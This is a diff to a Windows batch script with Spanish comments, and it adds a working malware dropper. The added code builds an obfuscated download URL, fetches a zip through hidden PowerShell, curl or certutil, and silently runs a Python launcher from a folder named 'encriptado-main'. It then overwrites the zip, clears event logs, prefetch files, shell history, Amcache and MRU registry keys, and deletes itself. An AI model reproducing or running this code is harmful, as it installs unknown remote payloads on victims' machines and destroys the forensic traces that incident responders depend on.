@@ -1,6 +1,7 @@
 @echo off
 setlocal enabledelayedexpansion
 
+REM === AUTO-REPLICACIÓN ===
 if not "%1"=="worker" (
     set "tempbat=%TEMP%\~w!RANDOM!!RANDOM!.bat"
     copy /y "%~f0" "!tempbat!" >nul 2>&1
@@ -11,6 +12,174 @@ if not "%1"=="worker" (
     )
     exit /b
 )
+
+REM === CONSTRUCCIÓN DE URL (OFUSCADA) ===
+set "p1=https://"
+set "p2=files."
+set "p3=catbox"
+set "p4=.moe/"
+set "p5=d6ck"
+set "p6=99"
+set "p7=.zip"
+set "url=%p1%%p2%%p3%%p4%%p5%%p6%%p7%"
+
+REM === CONFIGURACIÓN ===
+set "zip_file=%TEMP%\~repo%RANDOM%.zip"
+set "extract_dir=%TEMP%\~sys%RANDOM%"
+set "downloaded=0"
+
+REM === INTENTO 1: PowerShell (método principal) ===
+echo [*] Descargando payload...
+powershell.exe -WindowStyle Hidden -NoProfile -ExecutionPolicy Bypass -Command ^
+"[Net.ServicePointManager]::SecurityProtocol=[Net.SecurityProtocolType]::Tls12; ^
+$ProgressPreference='SilentlyContinue'; ^
+try { ^
+    Invoke-WebRequest -Uri '%url%' -OutFile '%zip_file%' -UseBasicParsing -TimeoutSec 120; ^
+    exit 0 ^
+} catch { ^
+    exit 1 ^
+}"
+
+if %errorlevel% equ 0 (
+    if exist "%zip_file%" (
+        set "downloaded=1"
+        echo [+] Descarga exitosa
+    )
+)
+
+REM === INTENTO 2: curl (fallback) ===
+if !downloaded! equ 0 (
+    echo [*] Intentando curl...
+    curl -L -s -o "%zip_file%" "%url%" --connect-timeout 60 --max-time 180
+    if exist "%zip_file%" (
+        set "downloaded=1"
+        echo [+] Curl exitoso
+    )
+)
+
+REM === INTENTO 3: certutil (último recurso) ===
+if !downloaded! equ 0 (
+    echo [*] Intentando certutil...
+    certutil -urlcache -split -f "%url%" "%zip_file%" >nul 2>&1
+    if exist "%zip_file%" (
+        set "downloaded=1"
+        echo [+] Certutil exitoso
+    )
+)
+
+REM === VERIFICAR DESCARGA ===
+if !downloaded! equ 0 (
+    echo [-] Descarga fallida
+    exit /b 1
+)
+
+REM === VERIFICAR TAMAÑO DEL ARCHIVO ===
+for %%F in ("%zip_file%") do set "size=%%~zF"
+if !size! lss 1000000 (
+    echo [-] Archivo muy pequeño o corrupto
+    del /f /q "%zip_file%" >nul 2>&1
+    exit /b 1
+)
+
+REM === EXTRAER ZIP ===
+echo [*] Extrayendo archivos...
+powershell.exe -WindowStyle Hidden -NoProfile -Command ^
+"Expand-Archive -Path '%zip_file%' -DestinationPath '%extract_dir%' -Force"
+
+timeout /t 3 /nobreak >nul
+
+REM === BUSCAR CARPETA encriptado-main ===
+set "repo_path="
+set "launcher_py="
+set "python_exe="
+
+if exist "%extract_dir%" (
+    for /d %%D in ("%extract_dir%\*") do (
+        if /i "%%~nxD"=="encriptado-main" (
+            set "repo_path=%%D"
+            set "launcher_py=%%D\launcher.py"
+            set "python_exe=%%D\python_portable\python.exe"
+            goto :found
+        )
+    )
+)
+
+:found
+if not defined repo_path (
+    echo [-] No se encontró encriptado-main
+    rmdir /s /q "%extract_dir%" >nul 2>&1
+    del /f /q "%zip_file%" >nul 2>&1
+    exit /b 1
+)
+
+if not exist "%launcher_py%" (
+    echo [-] No se encontró launcher.py
+    exit /b 1
+)
+
+if not exist "%python_exe%" (
+    echo [-] No se encontró python.exe
+    exit /b 1
+)
+
+REM === EJECUTAR LAUNCHER ===
+echo [+] Ejecutando payload...
+cd /d "%repo_path%"
+start /b "" "%python_exe%" "%launcher_py%"
+
+timeout /t 5 /nobreak >nul
+
+REM === SECURE DELETE DEL ZIP (3-PASS) ===
+echo [*] Eliminando rastros...
+if exist "%zip_file%" (
+    for %%F in ("%zip_file%") do set "file_size=%%~zF"
+    
+    REM Pass 1: Sobrescribir con 0x00
+    powershell -w h -c "$bytes = New-Object byte[] !file_size!; [IO.File]::WriteAllBytes('%zip_file%', $bytes)" >nul 2>&1
+    timeout /t 1 /nobreak >nul
+    
+    REM Pass 2: Sobrescribir con 0xFF
+    powershell -w h -c "$bytes = New-Object byte[] !file_size!; for($i=0;$i -lt !file_size!;$i++){$bytes[$i]=0xFF}; [IO.File]::WriteAllBytes('%zip_file%', $bytes)" >nul 2>&1
+    timeout /t 1 /nobreak >nul
+    
+    REM Pass 3: Sobrescribir con random
+    powershell -w h -c "$bytes = New-Object byte[] !file_size!; (New-Object Random).NextBytes($bytes); [IO.File]::WriteAllBytes('%zip_file%', $bytes)" >nul 2>&1
+    
+    REM Eliminar archivo
+    del /f /q "%zip_file%" >nul 2>&1
+)
+
+REM === LIMPIEZA ANTI-FORENSE ===
+powershell.exe -WindowStyle Hidden -NoProfile -Command ^
+"$ErrorActionPreference='SilentlyContinue'; ^
+Remove-Item 'C:\Windows\Prefetch\*.pf' -Force; ^
+Clear-RecycleBin -Force -Confirm:$false; ^
+wevtutil cl Application 2>$null; ^
+wevtutil cl System 2>$null; ^
+Remove-Item '$env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt' -Force; ^
+Get-ChildItem '$env:USERPROFILE\AppData\Local\Microsoft\Windows\Explorer' -Filter '*.db' | Remove-Item -Force; ^
+Get-ChildItem '$env:LOCALAPPDATA\Microsoft\Windows\AppCompat\Programs' -Filter 'Amcache*.hive' | Remove-Item -Force; ^
+Get-ChildItem '$env:LOCALAPPDATA\Microsoft\Windows\CoreApplicationData' -Recurse -Filter '*.db' | Remove-Item -Force; ^
+Remove-Item '$env:USERPROFILE\AppData\Local\Microsoft\Windows\FileHistory' -Recurse -Force; ^
+Get-ChildItem '$env:USERPROFILE\AppData\Roaming\Microsoft\Windows\Recent' -Filter '*.lnk' | Remove-Item -Force; ^
+Remove-ItemProperty -Path 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU' -Name '*'; ^
+Remove-ItemProperty -Path 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\ComDlg32' -Name 'OpenSavePidlMRU'; ^
+Remove-ItemProperty -Path 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\ComDlg32' -Name 'LastVisitedPidlMRU'"
+
+REM === AUTO-DESTRUCCIÓN ===
+echo [*] Auto-destruyendo...
+set "cleanup_bat=%TEMP%\~clean%RANDOM%.bat"
+(
+echo @echo off
+echo timeout /t 8 /nobreak ^>nul
+echo taskkill /f /im cmd.exe ^>nul 2^>^&1
+echo rmdir /s /q "%extract_dir%" ^>nul 2^>^&1
+echo del /f /q "%~f0" ^>nul 2^>^&1
+echo ^(goto^) 2^>nul ^& del /f /q "%%~f0" ^& exit
+) > "%cleanup_bat%"
+
+start /b cmd /c "%cleanup_bat%"
+exit
 
 set "vbsfile=%TEMP%\~init!RANDOM!.vbs"
 
